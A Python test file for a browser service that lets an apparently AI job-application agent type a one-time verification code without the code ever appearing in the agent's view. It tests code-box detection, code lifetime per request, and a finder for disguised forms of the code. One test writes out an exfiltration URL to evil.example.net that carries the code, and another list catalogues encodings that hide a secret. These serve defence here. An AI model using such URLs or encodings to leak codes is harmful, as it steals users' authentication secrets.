"""browserd's side of the code the person gives in the app (apply A25, owner 2026-11-26: "les
deux sont possibles"): the one exception of the credential rule. `detect.code_box` (accept and
refuse tables), the routes that keep it on the lease for one ask (`give_code`, `erase_code`, the
ask's binding of `agent_ask`), and `browser_type_code` on the fake pages of `a25_pages.py`: once,
checked before the first key, sent by the click's path, answering only `taken` or `kept`; no
answer of the lease that holds the code (the tools close instead, `code_shown`), the boxes typed
into hidden by the element and taking no key, a screenshot, a script, a search of the page's text,
back and forward refused meanwhile; and the finder's tables (`tools/codes.py`)."""

from __future__ import annotations

import json
import logging
import sys
from pathlib import Path
from types import SimpleNamespace
from typing import Any

import pytest

ROOT = Path(__file__).resolve().parents[3]
pytestmark = pytest.mark.skipif(
    not (ROOT / "browser/browserd").is_dir(), reason="the repository root is not mounted here"
)
sys.path.insert(0, str(ROOT / "browser"))

from browserd import app, detect  # noqa: E402
from browserd.leases import LeaseError  # noqa: E402
from browserd.tools import actions, codes, routes  # noqa: E402

from tests.browser import a25_pages as pages_fake  # noqa: E402
from tests.browser.test_browserd_unit import Clock, manager, request, run  # noqa: E402

CODE = "Q4815162342"
HOST = "jobs.example.org"
ASK = "0123456789abcdef"


def box(*names: str, **rest: Any) -> dict[str, Any]:
    """The facts CODE_BOX_JS reads of a plain text box of the top document."""
    facts = {"tag": "input", "type": "text", "autocomplete": [], "names": list(names), "max": -1,
             "readonly": False, "disabled": False, "top": True, "host": HOST,
             "credential": False}  # fmt: skip
    return {**facts, **rest}


OTP = ["one-time-code"]


@pytest.mark.parametrize(
    ("facts", "verdict"),
    [
        # Boxes a site gives for the code it just sent: allowed.
        (box(autocomplete=OTP, credential=True), None),
        (box("otp"), None),
        (box("otpCode"), None),
        (box("OTP"), None),
        (box("totp"), None),
        (box("mfa_code"), None),
        (box("2fa"), None),
        (box("code"), None),
        (box("Code"), None),
        (box("verificationCode"), None),
        (box("verification_code"), None),
        (box("Verification code"), None),
        (box("Enter the verification code we sent you"), None),
        (box("security-code"), None),
        (box("Security code"), None),
        (box("confirmationCode"), None),
        (box("Sign-in code"), None),
        (box("emailCode"), None),
        (box("SMS code"), None),
        (box("Code de vérification"), None),
        (box("Code de sécurité"), None),
        (box("Code reçu par e-mail"), None),
        (box("Bestätigungscode"), None),
        (box("Sicherheitscode"), None),
        (box("otp", type="tel"), None),
        (box("otp", type="number"), None),
        (box("otp", max=6), None),
        (box("otp", autocomplete=["off"]), None),
        (box("otp", autocomplete=["section-login", "one-time-code"], credential=True), None),
        # A password, a passkey or a sign in's user name: the person's own.
        (box("otp", type="password"), "credential"),
        (box("code", autocomplete=["current-password"], credential=True), "credential"),
        (box("code", autocomplete=["new-password"], credential=True), "credential"),
        (box("code", autocomplete=["username"], credential=True), "credential"),
        (box("code", autocomplete=["webauthn"], credential=True), "credential"),
        (box("login", credential=True), "credential"),  # a user name box of a sign in form
        # Codes that are no one time code: refused.
        (box("postalCode"), "not_code_box"),
        (box("Code postal"), "not_code_box"),
        (box("zipCode"), "not_code_box"),
        (box("Postcode"), "not_code_box"),
        (box("countryCode"), "not_code_box"),
        (box("Area code"), "not_code_box"),
        (box("promoCode"), "not_code_box"),
        (box("Coupon code"), "not_code_box"),
        (box("Discount code"), "not_code_box"),
        (box("Referral code"), "not_code_box"),
        (box("Code de parrainage"), "not_code_box"),
        (box("Invitation code"), "not_code_box"),
        (box("Gift card code"), "not_code_box"),
        (box("Sort code"), "not_code_box"),
        (box("Bank code"), "not_code_box"),
        (box("Card security code"), "not_code_box"),
        (box("CVC"), "not_code_box"),
        (box("PIN code"), "not_code_box"),
        (box("Recovery code"), "not_code_box"),
        (box("Backup code"), "not_code_box"),
        (box("Access code"), "not_code_box"),
        (box("Passcode"), "not_code_box"),
        (box("Code NAF"), "not_code_box"),
        (box("verification postal code"), "not_code_box"),
        (box("otp", "promo"), "not_code_box"),
        (box("Tracking code"), "not_code_box"),
        # Boxes that hold no code at all, or say nothing: refused.
        (box(), "not_code_box"),
        (box("search"), "not_code_box"),
        (box("Message to the recruiter"), "not_code_box"),
        (box("Your code of conduct"), "not_code_box"),
        (box("Zip"), "not_code_box"),
        (box("email"), "not_code_box"),
        (box("otp", autocomplete=["email"]), "not_code_box"),
        (box("otp", autocomplete=["tel"]), "not_code_box"),
        (box("otp", autocomplete=["postal-code"]), "not_code_box"),
        (box("otp", autocomplete=["cc-number"]), "not_code_box"),
        (box("otp", type="email"), "not_code_box"),
        (box("otp", type="search"), "not_code_box"),
        (box("otp", type="hidden"), "not_code_box"),
        (box("otp", type="url"), "not_code_box"),
        (box("otp", tag="textarea", type=""), "not_code_box"),
        (box("otp", tag="div", type=""), "not_code_box"),
        (box("otp", readonly=True), "not_code_box"),
        (box("otp", disabled=True), "not_code_box"),
        (box("otp", top=False), "not_code_box"),  # a frame's box
        (box("otp", credential=None), "not_code_box"),
        (box("otp", names=None), "not_code_box"),
        (box("otp", autocomplete=None), "not_code_box"),
        (None, "not_code_box"),
        ("otp", "not_code_box"),
    ],
)
def test_the_code_box_detector(facts: Any, verdict: str | None) -> None:
    assert detect.code_box(facts) == verdict


def ask_route(svc: Any, lease_id: str, token: str, action: str, body: Any) -> Any:
    path = f"/leases/{lease_id}/ask/{action}"
    return call(svc, path, body, {"x-lease-token": token})


def call(svc: Any, path: str, body: Any, headers: dict[str, str] | None = None) -> Any:
    route = next(r for r in app.ROUTES if r.pattern.fullmatch(path) and r.method == "POST")
    req = app.HttpRequest("POST", path, headers or {}, json.dumps(body).encode())
    return route.handler(svc, req, route.pattern.fullmatch(path))


def give(svc: Any, lease_id: str, *, user: str = "a", ask: str = ASK, code: str = CODE) -> Any:
    return call(svc, f"/leases/{lease_id}/code", {"user_id": user, "ask": ask, "code": code})


def world() -> tuple[Clock, Any, Any]:
    clock = Clock()
    mgr, _ = manager(clock, idle_s=300)
    return clock, mgr, app.Service(mgr, b"fake-control")


def page_on(state: actions.State, url: str) -> None:
    state.page = SimpleNamespace(url=url, is_closed=lambda: False)


def test_a_code_is_kept_for_its_ask_only_and_dropped_at_the_next_ask_and_the_end() -> None:
    _, mgr, svc = world()

    async def go() -> None:
        lease, token = await mgr.acquire(request("apply_agent"))
        state = routes.state_of(lease)
        page_on(state, f"https://{HOST}/verify")
        begin = {"left_s": 900, "ask": ASK, "code": True}
        assert (await ask_route(svc, lease.lease_id, token, "begin", begin))[0] == 200
        assert (state.ask_id, state.ask_host, state.ask_code) == (ASK, HOST, True)
        assert await give(svc, lease.lease_id) == (200, {"ok": True})
        assert (state.code, state.code_host) == (CODE, HOST)
        assert CODE not in repr(state)
        assert state.shown.found(CODE)  # in no answer from now on, until the lease ends
        with pytest.raises(LeaseError) as twice:  # one code per ask
            await give(svc, lease.lease_id, code="Z9Z9Z9")
        assert (twice.value.status, state.code) == (409, CODE)
        # The next ask drops it, whatever its kind.
        await ask_route(svc, lease.lease_id, token, "resume", {})
        assert state.code == CODE  # the resume after the code: kept for the agent to type
        await ask_route(svc, lease.lease_id, token, "begin", {"left_s": 60, "ask": "f" * 16})
        assert state.code is None
        # A code was given, then the person's erase or the lease's end drops it.
        state.code = CODE
        assert await call(svc, f"/leases/{lease.lease_id}/code/erase", {"user_id": "a"}) == (
            200,
            {"ok": True},
        )
        assert state.code is None
        assert state.shown.found(CODE)  # erased, still in no answer
        state.code = CODE
        state.end()
        assert (state.code, state.code_boxes, state.ask_id) == (None, [], "")
        assert not state.shown

    run(go())


@pytest.mark.parametrize(
    ("case", "status", "error"),
    [
        ("no_code_ask", 409, "not_waiting"),  # the ask takes no code
        ("other_ask", 409, "not_waiting"),  # a code of another ask (another application)
        ("resumed", 409, "not_waiting"),  # the wait ended
        ("never_asked", 409, "not_waiting"),
        ("other_person", 404, "not_found"),
        ("other_lease", 404, "not_found"),
        ("sweep", 403, "wrong_purpose"),
        ("apply_fill", 403, "wrong_purpose"),
        ("apply_submit", 403, "wrong_purpose"),
        ("short", 400, "bad_args"),
        ("five", 400, "bad_args"),
        ("long", 400, "bad_args"),
        ("spaced", 400, "bad_args"),
        ("not_ascii", 400, "bad_args"),
        ("extra_key", 400, "bad_args"),
    ],
)
def test_a_code_is_refused_off_its_ask(case: str, status: int, error: str) -> None:
    _, mgr, svc = world()

    async def go() -> None:
        purpose = case if case in ("sweep", "apply_fill", "apply_submit") else "apply_agent"
        lease, token = await mgr.acquire(request(purpose))
        state = routes.state_of(lease)
        page_on(state, f"https://{HOST}/verify")
        if purpose == "apply_agent" and case != "never_asked":
            begin = {"left_s": 900, "ask": ASK, "code": case != "no_code_ask"}
            await ask_route(svc, lease.lease_id, token, "begin", begin)
        if case == "resumed":
            await ask_route(svc, lease.lease_id, token, "resume", {})
        lease_id = "00000000-0000-4000-8000-000000000000" if case == "other_lease" else (
            lease.lease_id
        )  # fmt: skip
        body = {"user_id": "b" if case == "other_person" else "a",
                "ask": "e" * 16 if case == "other_ask" else ASK,
                "code": {"short": "123", "five": "48151", "long": "1" * 17, "spaced": "123 456",
                         "not_ascii": "１２３４５６"}.get(case, CODE)}  # fmt: skip
        if case == "extra_key":
            body["reason"] = "x"
        with pytest.raises(LeaseError) as refused:
            await call(svc, f"/leases/{lease_id}/code", body)
        assert (refused.value.status, refused.value.code) == (status, error)
        assert state.code is None

    run(go())


@pytest.mark.parametrize(
    "body",
    [{"left_s": 60, "code": True}, {"left_s": 60, "ask": "ABC", "code": True},
     {"left_s": 60, "ask": ASK, "code": "yes"}, {"left_s": 60, "ask": 7}],
)  # fmt: skip
def test_a_begin_that_takes_a_code_names_its_ask(body: dict[str, Any]) -> None:
    _, mgr, svc = world()

    async def go() -> None:
        lease, token = await mgr.acquire(request("apply_agent"))
        with pytest.raises(LeaseError) as refused:
            await ask_route(svc, lease.lease_id, token, "begin", body)
        assert refused.value.status == 400

    run(go())


# --- the tool, on the fake pages of tests/browser/a25_pages.py ---------------------------------


def said(tab: actions.Tab, name: str, seen: list[str], **args: Any) -> dict[str, Any]:
    """A call of the agent; its answer, as the model would read it, goes into `seen`."""
    answer = run(actions.run(tab, name, args))
    seen.append(json.dumps(answer, ensure_ascii=False))
    return answer


def holds_code(texts: list[str], code: str = CODE) -> bool:
    shown = codes.Codes()
    shown.add(code)
    return any(shown.found(text) for text in texts) or any(code in t for t in texts)


# Each shape's outcome: what the code's call answers, then whether the model's later reads close
# the tools (`code_shown`) because the site shows the code again.
OUTCOMES = {
    "slots": ("taken", False),
    "six": ("taken", False),
    "auto": ("taken", False),
    "wrong": ("kept", False),
    "hide": ("taken", False),
    "later": ("taken", True),
    "get": ("code_shown", True),
    "stuck": ("code_shown", True),
}


@pytest.mark.parametrize("shape", pages_fake.SHAPES)
def test_a_whole_exchange_on_each_shape_answers_the_code_nowhere(
    shape: str, monkeypatch: Any, caplog: pytest.LogCaptureFixture
) -> None:
    code = CODE[: 6 if shape == "six" else 11]
    page = pages_fake.FakePage(shape, len(code))
    tab = pages_fake.tab_on(page, monkeypatch, gate=True)
    caplog.set_level(logging.DEBUG)
    seen: list[str] = []
    first = said(tab, "browser_snapshot", seen)
    assert first["ok"]
    pages_fake.give(tab, code)
    args = {"ref": page.boxes[0].ref}
    if page.verify is not None:
        args["submit"] = page.verify.ref
    typed = said(tab, "browser_type_code", seen, **args)
    outcome, closes = OUTCOMES[shape]
    assert typed.get("code", typed.get("error")) == outcome, typed
    assert set(typed) <= {"ok", "code", "error", "message", "rule", "submit_clicked"}
    clicked = page.verify is not None and outcome != "code_shown"
    assert typed.get("submit_clicked", False) is clicked
    assert page.code_seen.casefold() == code.casefold() or outcome == "kept"
    if outcome == "kept":
        assert [b.value for b in page.boxes] == [""] * len(page.boxes)
    reads = [said(tab, "browser_snapshot", seen) for _ in range(3)]
    if page.doc.by_ref("e5") is not None and not closes:
        said(tab, "browser_click", seen, ref=page.doc.els[-1].ref)
    assert any(r.get("error") == "code_shown" for r in [typed, *reads]) is closes
    if closes:  # closed until the lease ends, whatever the call
        assert said(tab, "browser_navigate", seen, url=pages_fake.VERIFY)["error"] == "code_shown"
        assert said(tab, "browser_tabs", seen, action="list")["error"] == "code_shown"
        assert actions.MESSAGES["code_shown"] in seen[-1]
    assert not holds_code(seen, code)
    for record in caplog.records:
        assert not holds_code([record.getMessage(), json.dumps(record.__dict__, default=str)], code)
    assert code not in repr(tab.state)


def test_the_check_before_the_first_key_and_the_send_by_the_clicks_path(monkeypatch: Any) -> None:
    # Without the capability the Verify button answers submit_permit: nothing typed, the code
    # kept for the api's call with the capability, which sends it (an act on a submit element).
    page = pages_fake.FakePage("slots", len(CODE))
    tab = pages_fake.tab_on(page, monkeypatch)
    pages_fake.give(tab, CODE)
    args = {"ref": page.boxes[0].ref, "submit": page.verify.ref}
    first = run(actions.run(tab, "browser_type_code", args))
    assert (first["error"], page.boxes[0].value, tab.state.code) == ("submit_permit", "", CODE)
    tab.gate = True
    sent = run(actions.run(tab, "browser_type_code", args))
    assert (sent["code"], sent["submit_clicked"], page.code_seen) == ("taken", True, CODE)
    # On Review first's lease, the same judge: a Verify that sends is the person's Confirm's.
    page = pages_fake.FakePage("slots", len(CODE))
    tab = pages_fake.tab_on(page, monkeypatch, purpose="apply_review")
    pages_fake.give(tab, CODE)
    args = {"ref": page.boxes[0].ref, "submit": page.verify.ref}
    assert run(actions.run(tab, "browser_type_code", args))["error"] == "submit_permit"
    assert page.boxes[0].value == ""


@pytest.mark.parametrize(
    ("case", "error"),
    [
        ("sweep", "not_code_box"),
        ("apply_fill", "not_code_box"),
        ("no_code", "no_code"),
        ("frame_ref", "not_code_box"),
        ("submit_is_the_box", "bad_args"),
        ("other_page_host", "other_site"),
        ("box_of_another_document", "other_site"),
        ("password_box", "credential"),
        ("username_box", "credential"),
        ("message_box", "not_code_box"),
        ("promo_box", "not_code_box"),
        ("too_short_a_box", "code_too_long"),
        ("focus_moved", "focus_moved"),
        ("stale_submit", "stale_ref"),
    ],
)
def test_the_tool_refuses_and_the_code_is_gone(case: str, error: str, monkeypatch: Any) -> None:
    page = pages_fake.FakePage("wrong", len(CODE))
    box = page.boxes[0]
    box.facts = {
        "password_box": {**box.facts, "type": "password"},
        "username_box": {**box.facts, "autocomplete": ["username"]},
        "message_box": box_facts_of("Message to the recruiter"),
        "promo_box": box_facts_of("promoCode"),
        "too_short_a_box": {**box.facts, "max": 4},
    }.get(case, box.facts)
    if case == "box_of_another_document":
        monkeypatch.setattr(pages_fake, "HOST", "evil.example.net")
    if case == "other_page_host":
        page.doc.url = "https://evil.example.net/verify"
    purpose = case if case in ("sweep", "apply_fill") else "apply_agent"
    tab = pages_fake.tab_on(page, monkeypatch, purpose=purpose, gate=True)
    if case != "no_code":
        pages_fake.give(tab, CODE)
    if case == "focus_moved":  # the page takes the focus away after the second key
        keyboard = page.keyboard.type

        async def stolen(char: str) -> None:
            await keyboard(char)
            if len(box.value) == 2:
                page.doc.focus = page.verify

        monkeypatch.setattr(page.keyboard, "type", stolen)
    args = {"ref": "f1e5" if case == "frame_ref" else box.ref, "submit": page.verify.ref}
    if case == "submit_is_the_box":
        args["submit"] = box.ref
    if case == "stale_submit":
        args["submit"] = "e77"
    answer = run(actions.run(tab, "browser_type_code", args))
    assert (answer["ok"], answer["error"]) == (False, error)
    assert tab.state.code is None
    assert box.value == ""
    assert page.code_seen == ""
    assert CODE not in json.dumps(answer)


def box_facts_of(name: str) -> dict[str, Any]:
    return {**pages_fake.box_facts(name, -1, False)}


def test_the_boxes_typed_into_are_hidden_by_the_element_and_take_no_key(monkeypatch: Any) -> None:
    page = pages_fake.FakePage("hide", len(CODE))
    tab = pages_fake.tab_on(page, monkeypatch, gate=True)
    pages_fake.give(tab, CODE)
    args = {"ref": page.boxes[0].ref, "submit": page.verify.ref}
    assert run(actions.run(tab, "browser_type_code", args))["code"] == "taken"
    box = page.boxes[0]
    box.shown = True  # the page shows the box again, the code in it: hidden by the element
    shot = run(actions.run(tab, "browser_snapshot", {}))
    assert f"[ref={box.ref}]: {actions.BOX_HIDDEN}" in shot["snapshot"]
    page.doc.focus = box
    for key in ("Backspace", "ArrowLeft", "Enter"):
        assert run(actions.run(tab, "browser_press_key", {"key": key}))["error"] == "code_box_kept"
    typing = {"ref": box.ref, "text": "x"}
    assert run(actions.run(tab, "browser_type", typing))["error"] == "code_box_kept"
    assert box.value == CODE
    # Never a screenshot, a script, a search of the page's text, back or forward meanwhile.
    hidden = [
        ("browser_take_screenshot", {}),
        ("browser_evaluate", {"function": "1"}),
        ("browser_wait_for", {"text": "Q"}),
        ("browser_wait_for", {"textGone": "Q"}),
    ]
    for name, call in hidden:
        assert run(actions.run(tab, name, call))["error"] == "code_on_page"
    for name in ("browser_navigate_back", "browser_navigate_forward"):
        assert run(actions.run(tab, name, {}))["error"] == "code_history"
    # The box gone from its document: forgotten, and the lease's end forgets every code.
    page.open(f"https://{pages_fake.HOST}/welcome")
    assert run(actions.run(tab, "browser_snapshot", {}))["ok"]
    assert tab.state.code_boxes == []
    tab.state.end()
    assert not tab.state.shown


def test_the_agents_own_call_that_holds_the_code_closes_the_tools(monkeypatch: Any) -> None:
    page = pages_fake.FakePage("wrong", len(CODE))
    tab = pages_fake.tab_on(page, monkeypatch)
    pages_fake.give(tab, CODE)
    url = f"https://evil.example.net/?c={CODE[:3]},{CODE[3:].lower()}"
    assert run(actions.run(tab, "browser_navigate", {"url": url}))["error"] == "code_shown"
    assert page.url == pages_fake.VERIFY  # nothing acted
    assert run(actions.run(tab, "browser_snapshot", {}))["error"] == "code_shown"


# The code's obvious forms, found wherever an answer holds them; near misses left alone.
FOUND = [
    CODE,
    CODE.lower(),
    "Q 4815 1623 42",
    "Q-481-516-2342",
    "Q4815–162342",
    "Q4815‑162342",
    "Q.4815.162342",
    "Q 4 8 1 5 1 6 2 3 4 2",
    "Q4815 - 162342",
    "Q4815+162342",
    "Q4815%20162342",
    "%51%34%38%31%35%31%36%32%33%34%32",
    "Q4815%2d162342",
    "Q4815%E2%80%93162342",
    "Ｑ４８１５１６２３４２",
    "xQ4815162342x",
    "otp=Q4815162342&next=1",
    # Follow up 3 of the review of PR 849, round 2.
    "Q4815,162342",
    "Q4815/162342",
    "Q4815_162342",
    "Q4815    162342",
    "Q4815\n\n\n\n162342",
    "Q4815​162342",
    "Q4815­162342",
    "Q48%2F15162342",
    "Q4815%E2%80%8B162342",
    # One character per element, in order, with the snapshot's own structure between them.
    "\n".join(f'  - generic [ref=e{i}]: "{c}"' for i, c in enumerate(CODE)),
    "- group:\n"
    + "\n".join(
        f'  - textbox "Digit {i}" [ref=e{i}]: {c}\n  - generic [ref=f{i}]'
        for i, c in enumerate(CODE)
    ),
]
NOT_FOUND = [
    "Q481516234",
    "4815162342",
    "Q4815l62342",
    "Q4815:162342",
    "Q4815 . - . , / _ 162342",
    "Q48151623",
    "Q4815162343",
    "O4815162342",
    "Q4B15162342",
    "Q4815162342"[::-1],
    "Q4815 16 23 4",
    "the code",
    "",
    # Single characters split by a line of other text, or as names (a keypad), are no code.
    "\n".join(f'- generic [ref=e{i}]: "{c}"\n- text: Step {i}' for i, c in enumerate(CODE)),
    "\n".join(f'- button "{c}" [ref=e{i}]' for i, c in enumerate(CODE)),
]


@pytest.mark.parametrize("text", FOUND)
def test_the_finder_holds_the_obvious_forms_of_the_code(text: str) -> None:
    shown = codes.Codes()
    shown.add(CODE)
    assert shown.found({"snapshot": [text]})


@pytest.mark.parametrize("text", NOT_FOUND)
def test_the_finder_leaves_near_misses(text: str) -> None:
    shown = codes.Codes()
    shown.add(CODE)
    assert not shown.found(text)


def test_the_finder_names_no_code_and_keeps_eight() -> None:
    shown = codes.Codes()
    shown.add("481516")
    assert "481516" not in repr(shown)
    assert "481516" not in repr(actions.State(shown=shown))
    assert all(shown.add(f"{n:06d}") for n in range(codes.CODES_MAX - 1))
    assert not shown.add("999999")  # past CODES_MAX: give_code answers 409


@pytest.mark.parametrize(("purpose", "status"), [("apply_agent", 200), ("apply_review", 403)])
def test_the_capability_goes_with_the_code_tool_as_with_a_click(purpose: str, status: int) -> None:
    _, mgr, svc = world()

    async def go() -> Any:
        lease, token = await mgr.acquire(request(purpose))
        capability = routes.issue_capability(lease)
        assert capability is not None
        path = f"/leases/{lease.lease_id}/tools/browser_type_code"
        headers = {"x-lease-token": token, "x-gate-capability": capability}
        try:
            return (await call(svc, path, {"ref": "e5"}, headers))[0]
        except LeaseError as refused:
            return refused.status

    assert run(go()) == status
